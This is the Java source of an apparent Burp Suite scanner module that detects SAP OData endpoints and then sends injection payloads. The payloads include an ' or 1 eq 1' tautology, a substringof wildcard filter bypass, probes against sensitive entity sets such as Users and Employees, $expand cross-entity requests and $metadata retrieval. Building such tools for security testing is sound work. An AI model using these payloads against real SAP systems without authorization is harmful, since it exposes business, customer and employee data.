package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: SAP OData Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on SAP OData error indicators in responses. Only when
 * SAP is confirmed does it fire OData injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body, URL, and headers for SAP OData indicators
 *   3. If NO SAP indicators -> returns empty (zero payloads sent)
 *   4. If SAP detected -> reports INFO finding, then injects OData payloads
 *   5. Preserves original encoding (URL-encoded or raw)
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class SapODataScanner implements ScanModule {

    private static final String MODULE_ID = "sap-odata-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // -- SAP detection patterns (passive gate) --------------------------------

    // Error messages that confirm SAP / ABAP / Gateway / NetWeaver
    private static final Pattern SAP_ERROR_PATTERN = Pattern.compile(
            "SAP-ABAP|CX_SY_|CX_SXML_|/IWBEP/|/IWFND/|SAP Gateway|"
                    + "sap-statistics|SAP NetWeaver|com\\.sap\\.|SAP_BASIS|"
                    + "ABAP Runtime Error|Short dump|RAISE_EXCEPTION|"
                    + "MESSAGE_TYPE_X|BAPIException|CX_ST_|"
                    + "OData service.*SAP",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate SAP OData endpoints
    private static final Pattern SAP_URL_PATTERN = Pattern.compile(
            "/sap/opu/odata/|/sap/odata/|sap-client=|/IWBEP/|/IWFND/",
            Pattern.CASE_INSENSITIVE);

    // Response headers specific to SAP -- only truly SAP-specific headers
    private static final Set<String> SAP_HEADERS = Set.of(
            "sap-server", "sap-perf-fesrec", "sap-statistics", "sap-processing-info");

    // x-csrf-token is SAP-specific only when combined with SAP URL
    private static final String CSRF_HEADER = "x-csrf-token";

    // -- OData parameter name hints -------------------------------------------

    private static final Set<String> ODATA_PARAM_NAMES = Set.of(
            "$filter", "$expand", "$select", "$orderby", "$top", "$skip",
            "$search", "$apply", "sap-value-list");

    // OData filter operator keywords for value-based detection
    private static final Pattern ODATA_OPERATOR_PATTERN = Pattern.compile(
            "\\b(eq|and|or|gt|lt|ge|le|ne)\\b", Pattern.CASE_INSENSITIVE);

    // -- Phase 2: Entity Enumeration -- sensitive SAP entities ----------------

    // Only restricted entities — removed A_Product/MaterialSet/A_CompanyCode (accessible by design)
    private static final String[] SENSITIVE_ENTITIES = {
            "Users", "A_BusinessPartner", "BusinessPartnerSet", "A_SalesOrder", "SalesOrderSet",
            "A_PurchaseOrder", "PurchaseOrderSet", "A_Supplier", "A_Customer",
            "A_CostCenter", "Employees", "EmployeeSet"
    };

    // -- Phase 3: $expand navigation properties -------------------------------

    private static final String EXPAND_PROPERTIES = "to_Partner,to_SalesOrder,to_Address";

    // -- ScanModule interface -------------------------------------------------

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "SAP OData Injection"; }
    @Override public String getDescription() {
        return "Detects SAP OData endpoints and tests for OData filter injection, "
                + "entity enumeration, cross-entity access, and metadata exposure. "
                + "Only activates when SAP indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used -- no OOB needed for OData injection
    }

    @Override public void destroy() {}

    // -- Main entry point -----------------------------------------------------

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for SAP OData indicators
        SapDetection detection = detectSapOData(requestResponse);
        if (detection == null) return Collections.emptyList();

        // SAP confirmed -- report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "sap-odata-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "SAP OData Endpoint Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running SAP OData services (Gateway/NetWeaver). "
                            + "OData injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[SAP-OData] SAP OData detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject OData payloads
        try {
            testODataInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // -- SAP Detection (passive gate) -----------------------------------------

    private SapDetection detectSapOData(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal -- sufficient alone)
        if (SAP_ERROR_PATTERN.matcher(body).find()) {
            return new SapDetection("SAP error pattern in response body",
                    extractEntitySetFromUrl(url));
        }

        // Check 2: URL pattern + SAP-specific header (require both)
        if (SAP_URL_PATTERN.matcher(url).find()) {
            // Check for SAP-specific response headers as corroboration
            for (var h : reqResp.response().headers()) {
                String headerName = h.name().toLowerCase();
                if (SAP_HEADERS.contains(headerName)) {
                    return new SapDetection(
                            "SAP URL pattern (" + url + ") + header: " + h.name(),
                            extractEntitySetFromUrl(url));
                }
            }

            // x-csrf-token combined with SAP URL is also a strong signal
            for (var h : reqResp.response().headers()) {
                if (h.name().equalsIgnoreCase(CSRF_HEADER)) {
                    return new SapDetection(
                            "SAP URL pattern + x-csrf-token header",
                            extractEntitySetFromUrl(url));
                }
            }
        }

        return null; // No SAP detected -- module stays dormant
    }

    // -- Active OData Injection Testing ---------------------------------------

    private void testODataInjection(HttpRequestResponse original, SapDetection detection,
                                     String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find the injectable parameter(s) -- prioritize OData parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[SAP-OData] Testing parameter '" + target.name
                    + "' (encoding: " + target.encoding + ") on " + url);

            // Phase 1: Filter Injection
            testFilterInjection(original, target, detection.entitySetName, url);

            // Phase 2: Entity Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testEntityEnumeration(original, target, url);

            // Phase 3: $expand Cross-Entity Access
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testExpandCrossEntity(original, target, url);

            // Phase 4: Metadata Exposure
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testMetadataExposure(original, url, urlPath);
        }
    }

    // -- Phase 1: Filter Injection --------------------------------------------

    private void testFilterInjection(HttpRequestResponse original, InjectableParam target,
                                      String entitySetName, String url) throws InterruptedException {
        if (entitySetName == null || entitySetName.isEmpty()) entitySetName = "BusinessPartners"; // fallback

        // Baseline: original response
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineRows = countResultRows(baselineBody);

        // Payload 1: Tautology -- append ' or 1 eq 1' to existing $filter value
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String tautologyPayload = target.decodedValue + " or 1 eq 1";
            HttpRequestResponse result = sendPayload(original, target, tautologyPayload);
            if (result != null && result.response() != null
                    && result.response().statusCode() < 400
                    && ResponseGuard.isUsableResponse(result)) {

                String resultBody = result.response().bodyToString();
                if (resultBody == null) resultBody = "";
                int resultRows = countResultRows(resultBody);

                if (resultRows > baselineRows + 2 && result.response().statusCode() == 200) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "SAP OData Filter Injection -- Tautology Bypass",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Injected tautology ' or 1 eq 1' returned " + resultRows
                                    + " rows vs baseline " + baselineRows + " rows. "
                                    + "OData filter was bypassed to return additional records.")
                            .payload(tautologyPayload)
                            .requestResponse(result)
                            .build());
                    return; // One confirmed finding per phase
                }
            }
            perHostDelay();
        }

        // Payload 2: Wildcard -- replace $filter with substringof('',EntityName) eq true
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String wildcardPayload = "substringof(''," + entitySetName + ") eq true";
            HttpRequestResponse result = sendPayload(original, target, wildcardPayload);
            if (result != null && result.response() != null
                    && result.response().statusCode() < 400
                    && ResponseGuard.isUsableResponse(result)) {

                String resultBody = result.response().bodyToString();
                if (resultBody == null) resultBody = "";
                int resultRows = countResultRows(resultBody);

                if (resultRows > baselineRows + 2 && result.response().statusCode() == 200) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "SAP OData Filter Injection -- Wildcard Bypass",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Injected substringof wildcard returned " + resultRows
                                    + " rows vs baseline " + baselineRows + " rows. "
                                    + "OData filter was bypassed using substringof function.")
                            .payload(wildcardPayload)
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // -- Phase 2: Entity Enumeration ------------------------------------------

    private void testEntityEnumeration(HttpRequestResponse original, InjectableParam target,
                                        String url) throws InterruptedException {
        // Differential probe: two different entities must produce different responses
        // to confirm the URL path entity set is actually being processed
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String baseUrl = original.request().url();
        String entitySetInUrl = extractEntitySetFromUrl(baseUrl);

        // We need to manipulate the URL path, not a parameter value, for entity enumeration.
        // Build probe URLs by replacing the entity set name in the path.
        if (entitySetInUrl == null || entitySetInUrl.isEmpty()) return;

        HttpRequestResponse resultA = sendEntityProbe(original, entitySetInUrl, "Users");
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        HttpRequestResponse resultB = sendEntityProbe(original, entitySetInUrl, "SalesOrders");
        perHostDelay();

        if (resultA == null || resultA.response() == null || resultB == null || resultB.response() == null) return;
        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, entity set is not influencing the query
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[SAP-OData] Entity enumeration: differential probe failed -- entity set name '"
                    + entitySetInUrl + "' does not influence response. Skipping.");
            return;
        }

        for (String entity : SENSITIVE_ENTITIES) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            HttpRequestResponse result = sendEntityProbe(original, entitySetInUrl, entity);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            int status = result.response().statusCode();
            if (status >= 400 && status < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require OData result markers: "results", "d", or "value" in response body
            boolean hasResultsMarker = body.contains("\"results\"") || body.contains("\"d\"")
                    || body.contains("\"value\"");
            if (status == 200 && body.length() > 50
                    && hasResultsMarker
                    && !body.toLowerCase().contains("does not exist")
                    && !body.toLowerCase().contains("not found")
                    && !body.toLowerCase().contains("resource not found")) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "SAP OData Sensitive Entity Accessible -- " + entity,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter("entity-set")
                        .evidence("OData query against entity set '" + entity + "' returned data. "
                                + "Differential probe confirmed entity set name influences query results. "
                                + "Response length: " + body.length() + " bytes.")
                        .payload(entity)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // -- Phase 3: $expand Cross-Entity Access ---------------------------------

    private void testExpandCrossEntity(HttpRequestResponse original, InjectableParam target,
                                        String url) throws InterruptedException {
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Inject $expand=to_Partner,to_SalesOrder,to_Address into URL
        HttpRequestResponse result = sendExpandProbe(original, EXPAND_PROPERTIES);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check for new navigation property data in response
        int newKeyCount = countNewJsonKeys(baselineBody, resultBody);
        if (newKeyCount >= 3 && result.response().statusCode() == 200) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "SAP OData $expand Cross-Entity Data Access",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter("$expand")
                    .evidence("Injected $expand=" + EXPAND_PROPERTIES + " returned "
                            + newKeyCount + " new JSON keys from expanded navigation properties "
                            + "not present in baseline response.")
                    .payload("$expand=" + EXPAND_PROPERTIES)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // -- Phase 4: Metadata Exposure -------------------------------------------

    private void testMetadataExposure(HttpRequestResponse original, String url,
                                       String urlPath) throws InterruptedException {
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        if (!dedup.markIfNew(MODULE_ID, urlPath, "$metadata-exposure")) return;

        // Build $metadata URL from the service root
        String metadataUrl = buildMetadataUrl(original.request().url());
        if (metadataUrl == null) return;

        try {
            HttpRequest metadataRequest = HttpRequest.httpRequestFromUrl(metadataUrl);
            // Copy headers from original request (auth cookies, CSRF tokens, etc.)
            for (var h : original.request().headers()) {
                String name = h.name().toLowerCase();
                if (name.equals("cookie") || name.equals("authorization")
                        || name.equals("x-csrf-token") || name.equals("sap-client")) {
                    metadataRequest = metadataRequest.withRemovedHeader(h.name())
                            .withAddedHeader(h.name(), h.value());
                }
            }

            HttpRequestResponse result = api.http().sendRequest(metadataRequest);
            if (result == null || result.response() == null) return;
            if (!ResponseGuard.isUsableResponse(result)) return;

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Check for OData metadata XML markers
            boolean hasEntityType = body.contains("<EntityType");
            boolean hasProperty = body.contains("<Property");
            boolean hasNavProperty = body.contains("<NavigationProperty");

            if (result.response().statusCode() == 200
                    && (hasEntityType || hasProperty || hasNavProperty)) {

                int entityTypeCount = countOccurrences(body, "<EntityType");
                int propertyCount = countOccurrences(body, "<Property");
                int navPropertyCount = countOccurrences(body, "<NavigationProperty");

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "SAP OData $metadata Exposed",
                                Severity.INFO, Confidence.CERTAIN)
                        .url(metadataUrl)
                        .evidence("$metadata endpoint is accessible and exposes the full OData schema. "
                                + "Found " + entityTypeCount + " EntityTypes, "
                                + propertyCount + " Properties, "
                                + navPropertyCount + " NavigationProperties. "
                                + "This reveals the entire data model of the SAP service.")
                        .payload("$metadata")
                        .requestResponse(result)
                        .build());
            }
        } catch (Exception e) {
            // Silently ignore -- metadata probe is best-effort
        }
        perHostDelay();
    }

    // -- Target Identification ------------------------------------------------

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            String name = param.name();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // Detect encoding
            Encoding encoding = detectEncoding(value);
            String decoded = decode(value, encoding);

            // Priority 1: Value contains OData filter operators (strongest signal)
            if (decoded != null && ODATA_OPERATOR_PATTERN.matcher(decoded).find()) {
                targets.add(0, new InjectableParam(name, value, decoded,
                        param.type(), encoding, true));
                continue;
            }

            // Priority 2: Parameter name matches known OData parameter names
            if (ODATA_PARAM_NAMES.contains(name) || ODATA_PARAM_NAMES.contains(name.toLowerCase())) {
                targets.add(new InjectableParam(name, value, decoded,
                        param.type(), encoding, false));
            }
        }

        // If no specific targets found, don't test random parameters
        // OData injection only makes sense on OData-carrying parameters
        return targets;
    }

    // -- Encoding Detection & Preservation ------------------------------------

    private enum Encoding { RAW, URL_ENCODED, DOUBLE_URL_ENCODED }

    private Encoding detectEncoding(String value) {
        if (value == null) return Encoding.RAW;

        // Double URL-encoded: contains %25xx
        if (value.contains("%2520") || value.contains("%2527") || value.contains("%253D")) {
            return Encoding.DOUBLE_URL_ENCODED;
        }

        // URL-encoded: contains %xx patterns typical of OData filters
        if (value.contains("%20") || value.contains("%27") || value.contains("%3D")
                || value.contains("%24") || value.contains("%28") || value.contains("%29")) {
            return Encoding.URL_ENCODED;
        }

        return Encoding.RAW;
    }

    private String decode(String value, Encoding encoding) {
        if (value == null) return null;
        try {
            switch (encoding) {
                case URL_ENCODED:
                    return URLDecoder.decode(value, StandardCharsets.UTF_8);
                case DOUBLE_URL_ENCODED:
                    String single = URLDecoder.decode(value, StandardCharsets.UTF_8);
                    return URLDecoder.decode(single, StandardCharsets.UTF_8);
                default:
                    return value;
            }
        } catch (Exception e) {
            return value;
        }
    }

    private String encode(String payload, Encoding encoding) {
        if (payload == null) return null;
        try {
            switch (encoding) {
                case URL_ENCODED:
                    // Montoya's withUpdatedParameters() handles URL encoding internally,
                    // so return the raw payload to avoid double-encoding.
                    return payload;
                case DOUBLE_URL_ENCODED:
                    // Montoya adds one layer of URL encoding, so we encode once here
                    // and let Montoya apply the second layer.
                    return URLEncoder.encode(payload, StandardCharsets.UTF_8);
                default:
                    return payload;
            }
        } catch (Exception e) {
            return payload;
        }
    }

    // -- HTTP Request Sending -------------------------------------------------

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String odataPayload) {
        if (ScanState.isCancelled()) return null;

        // Encode the payload to match the original parameter's encoding
        String encoded = encode(odataPayload, target.encoding);

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, encoded));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, encoded));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a probe request with the entity set name replaced in the URL path.
     * E.g., /sap/opu/odata/sap/SERVICE/OriginalEntitySet -> /sap/opu/odata/sap/SERVICE/ProbeEntity
     */
    private HttpRequestResponse sendEntityProbe(HttpRequestResponse original,
                                                 String originalEntitySet, String probeEntity) {
        if (ScanState.isCancelled()) return null;

        try {
            String originalUrl = original.request().url();
            String modifiedUrl = originalUrl.replace("/" + originalEntitySet, "/" + probeEntity);
            if (modifiedUrl.equals(originalUrl)) return null; // replacement failed

            HttpRequest modified = original.request().withPath(
                    extractFullPath(modifiedUrl));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a probe request with $expand parameter added to the URL.
     */
    private HttpRequestResponse sendExpandProbe(HttpRequestResponse original, String expandValue) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest modified = original.request().withUpdatedParameters(
                    HttpParameter.urlParameter("$expand", expandValue));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    // -- Entity Set Name Extraction -------------------------------------------

    /**
     * Extract the entity set name from a SAP OData URL.
     * Typical patterns:
     *   /sap/opu/odata/sap/SERVICE_NAME/EntitySet
     *   /sap/odata/SERVICE_NAME/EntitySet
     * The entity set is the last path segment before query parameters.
     */
    private String extractEntitySetFromUrl(String url) {
        if (url == null) return null;
        try {
            // Strip query parameters
            int qIdx = url.indexOf('?');
            String path = (qIdx >= 0) ? url.substring(0, qIdx) : url;

            // Find the last path segment
            int lastSlash = path.lastIndexOf('/');
            if (lastSlash < 0 || lastSlash == path.length() - 1) return null;

            String segment = path.substring(lastSlash + 1);
            // Strip any parenthesized key, e.g., EntitySet('key') -> EntitySet
            int parenIdx = segment.indexOf('(');
            if (parenIdx > 0) segment = segment.substring(0, parenIdx);

            // Validate: entity set names are alphanumeric with underscores
            if (segment.matches("[A-Za-z_][A-Za-z0-9_]*")) {
                return segment;
            }
        } catch (Exception ignored) {}
        return null;
    }

    /**
     * Build the $metadata URL from a SAP OData service URL.
     * Strips the entity set and query params, appends $metadata.
     * E.g., /sap/opu/odata/sap/SERVICE/EntitySet?$filter=... -> /sap/opu/odata/sap/SERVICE/$metadata
     */
    private String buildMetadataUrl(String url) {
        if (url == null) return null;
        try {
            // Strip query parameters
            int qIdx = url.indexOf('?');
            String path = (qIdx >= 0) ? url.substring(0, qIdx) : url;

            // Find SAP OData service root by looking for the service path pattern
            Pattern serviceRootPattern = Pattern.compile(
                    "(/sap/opu/odata/[^/]+/[^/]+|/sap/odata/[^/]+/[^/]+)",
                    Pattern.CASE_INSENSITIVE);
            var matcher = serviceRootPattern.matcher(path);
            if (matcher.find()) {
                // Reconstruct full URL with $metadata
                String beforePath = "";
                int schemeEnd = url.indexOf("://");
                if (schemeEnd >= 0) {
                    int pathStart = url.indexOf('/', schemeEnd + 3);
                    if (pathStart >= 0) {
                        beforePath = url.substring(0, pathStart);
                    }
                }
                return beforePath + matcher.group(1) + "/$metadata";
            }

            // Fallback: strip last segment and append $metadata
            int lastSlash = path.lastIndexOf('/');
            if (lastSlash > 0) {
                String beforePath = "";
                int schemeEnd = url.indexOf("://");
                if (schemeEnd >= 0) {
                    int pathStart = url.indexOf('/', schemeEnd + 3);
                    if (pathStart >= 0) {
                        beforePath = url.substring(0, pathStart);
                        path = path.substring(pathStart);
                    }
                }
                lastSlash = path.lastIndexOf('/');
                if (lastSlash > 0) {
                    return beforePath + path.substring(0, lastSlash) + "/$metadata";
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    // -- Utility Methods ------------------------------------------------------

    /**
     * Count result rows by looking for common OData result indicators.
     * SAP OData responses typically contain "__metadata" per entity in OData v2
     * or entries in "results" / "value" arrays in the response.
     */
    private int countResultRows(String body) {
        int metadataCount = countOccurrences(body, "\"__metadata\"");
        int resultsCount = countOccurrences(body, "\"results\"");
        // Return whichever count is higher as the row indicator
        return Math.max(metadataCount, resultsCount);
    }

    private int countNewJsonKeys(String baseline, String result) {
        // Count JSON keys in result that don't appear in baseline
        Pattern keyPattern = Pattern.compile("\"(\\w+)\"\\s*:");
        Set<String> baselineKeys = new HashSet<>();
        var bm = keyPattern.matcher(baseline);
        while (bm.find()) baselineKeys.add(bm.group(1));

        Set<String> newKeys = new HashSet<>();
        var rm = keyPattern.matcher(result);
        while (rm.find()) {
            if (!baselineKeys.contains(rm.group(1))) newKeys.add(rm.group(1));
        }
        return newKeys.size();
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("sap-odata.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Extract the full path (including query string) from a URL for use with withPath().
     */
    private String extractFullPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) {
                int pathStart = url.indexOf('/', s + 3);
                if (pathStart >= 0) return url.substring(pathStart);
            }
        } catch (Exception ignored) {}
        return url;
    }

    // -- Inner classes --------------------------------------------------------

    private static class SapDetection {
        final String evidence;
        final String entitySetName;
        SapDetection(String evidence, String entitySetName) {
            this.evidence = evidence;
            this.entitySetName = entitySetName;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final String decodedValue;
        final HttpParameterType paramType;
        final Encoding encoding;
        final boolean hasODataOperators; // true if the value contains OData filter operators

        InjectableParam(String name, String originalValue, String decodedValue,
                         HttpParameterType paramType, Encoding encoding, boolean hasODataOperators) {
            this.name = name;
            this.originalValue = originalValue;
            this.decodedValue = decodedValue;
            this.paramType = paramType;
            this.encoding = encoding;
            this.hasODataOperators = hasODataOperators;
        }
    }
}
